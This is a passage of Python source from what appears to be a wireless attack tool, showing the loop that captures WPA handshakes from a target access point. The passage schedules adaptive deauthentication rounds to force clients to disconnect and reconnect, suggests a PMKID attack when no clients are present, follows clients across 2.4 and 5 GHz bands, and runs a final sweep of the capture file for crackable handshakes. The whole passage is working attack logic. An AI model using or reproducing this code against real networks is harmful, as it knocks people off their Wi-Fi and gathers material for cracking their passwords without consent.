                            use_band_block = band_block and deauth_params.use_band_block
                            next_tool = deauth_dispatcher.peek_next_tools(last_deauth_outcome)
                            next_tool_label = "+".join(t.value for t in next_tool) if next_tool else "none"
                            self.tracker.log(
                                f"[cyan]Adaptive[/] {deauth_engine.last_reason} → "
                                f"next in [yellow]{deauth_params.interval:.0f}s[/], "
                                f"listen [green]{deauth_params.listen_window:.0f}s[/], "
                                f"{deauth_params.packet_count} pkt, tool [cyan]{next_tool_label}[/]",
                                tag="handshake",
                            )
                            next_deauth = time.time() + (
                                deauth_params.interval + deauth_params.passive_extension
                            )
                        else:
                            next_deauth = now + deauth_params.interval
                        if (
                            cap
                            and not deauth_warned
                            and (
                                deauth_engine.should_warn_ineffective()
                                or (
                                    deauth_rounds >= 2
                                    and not cap_has_reconnect(cap, self.ap.bssid)
                                )
                            )
                        ):
                            deauth_warned = True
                            self._deauth_adaptive_exhausted = True
                            band = self.ap.band_label
                            if deauth_engine.enabled:
                                adapt_detail = deauth_engine.ineffective_warning_detail()
                                next_tool = deauth_dispatcher.peek_next_tools(
                                    last_deauth_outcome,
                                )
                                tool_hint = (
                                    "+".join(t.value for t in next_tool)
                                    if next_tool else "none"
                                )
                                adapt_line = (
                                    f"[cyan]Adaptive next:[/] {adapt_detail} "
                                    f"[dim]|[/] tool [cyan]{tool_hint}[/]"
                                )
                            else:
                                adapt_line = (
                                    f"[cyan]Next:[/] passive listen "
                                    f"[yellow]{deauth_params.listen_window:.0f}s[/] "
                                    f"then deauth every "
                                    f"[yellow]{deauth_params.interval:.0f}s[/]"
                                )
                            pmkid_tip = (
                                "[dim]Tip:[/] PMKID works without clients "
                                "([yellow]--pmkid[/])"
                            )
                            if self.ap.radio_band == "5" and self._sibling_band_ap():
                                pmkid_tip += (
                                    " — or wait for 2.4 GHz sibling fallback"
                                )
                            self.tracker.log(
                                f"[yellow]Deauth ineffective[/] after "
                                f"{deauth_rounds} round(s) on {band} — no "
                                f"reconnect/EAPOL in capture. Client may use "
                                f"PMF, ignore deauth, or roam bands. "
                                f"{adapt_line}. {pmkid_tip}",
                                tag="handshake",
                            )
                        continue

                    heard = active_clients(clients, client_power, self.ap.bssid)
                    self.status(
                        "capture",
                        f"Listening ({remaining}s left, deauth in {int(next_deauth - now)}s)",
                        timeout=timeout,
                        started=started,
                        clients=len(heard) or len(clients),
                        deauths=deauth_rounds,
                        cap_kb=cap_kb,
                        **self._capture_health_stats(cap),
                    )
                    time.sleep(1.0)

                heard = active_clients(clients, client_power, self.ap.bssid)
                if self.cfg.attack.client_band_stalk and heard and deauth_rounds > 0:
                    stalk_found = self._client_band_stalk_round(
                        heard,
                        started=started,
                        timeout=timeout,
                        deauth_rounds=deauth_rounds,
                        deadline=deadline,
                    )
                    if stalk_found:
                        return stalk_found
                    self.cfg.scan.interface = recover_interface(
                        self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
                    )
                    set_channel(
                        self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
                    )
                    if not dump.alive():
                        dump.restart()

                self.tracker.log("[yellow]Final handshake sweep...[/]", tag="handshake")
                reset_check_cache()
                cap = dump.get_cap_file()
                if deauth_rounds > 0 and not self.cfg.attack.no_deauth:
                    self._deauth_adaptive_exhausted = True
                found = self._try_handshake(
                    cap,
                    clients=len(clients),
                    deauth_rounds=deauth_rounds,
                    cap_kb=os.path.getsize(cap) // 1024 if cap and os.path.exists(cap) else 0,
                    started=started,
                    timeout=timeout,
                    alt_bssids=channel_bssids,
                    capture_phase="final_sweep",
                )
                if found:
                    return found

        except Exception as e:
            self.tracker.log(f"[red]capture error: {e}[/]", tag="handshake")
            return None

        self.tracker.log(f"[red]No handshake after {timeout}s[/]", tag="handshake")
        return None